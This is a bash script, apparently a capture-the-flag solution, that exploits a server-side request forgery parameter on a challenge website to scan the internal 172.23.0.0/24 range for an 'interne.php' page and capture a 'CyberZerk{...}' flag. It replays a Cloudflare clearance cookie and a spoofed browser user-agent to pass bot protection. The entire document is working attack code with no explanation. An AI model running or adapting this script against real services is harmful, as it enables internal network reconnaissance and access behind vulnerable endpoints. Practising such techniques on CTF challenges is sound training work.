#!/usr/bin/env bash
CF="$1"; BASE="https://restructuration.cyberzerk.fr/"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36"
for i in $(seq 1 254); do
  p="http://172.23.0.$i/interne.php"
  out=$(curl -sG "$BASE" --data-urlencode "url=$p" -H "user-agent: $UA" \
        -b "cf_clearance=$CF" --max-time 6 -w '\n__T=%{time_total}')
  t=$(printf '%s' "$out" | sed -n 's/.*__T=//p')
  body=$(printf '%s' "$out" | sed 's/__T=.*//')
  res=$(printf '%s' "$body" | grep -aoiE 'Impossible de récupérer|interdit|votre IP[^<]*|CyberZerk\{[^}]*\}' | head -1)
  printf '172.23.0.%-3d t=%ss  %s\n' "$i" "$t" "${res:-?? DIFERENTE}"
  if printf '%s' "$body" | grep -aqiE 'CyberZerk\{|votre IP'; then
    echo "   >>> ACHEI:"; printf '%s\n' "$body" | sed -n '1,40p'; break
  fi
done
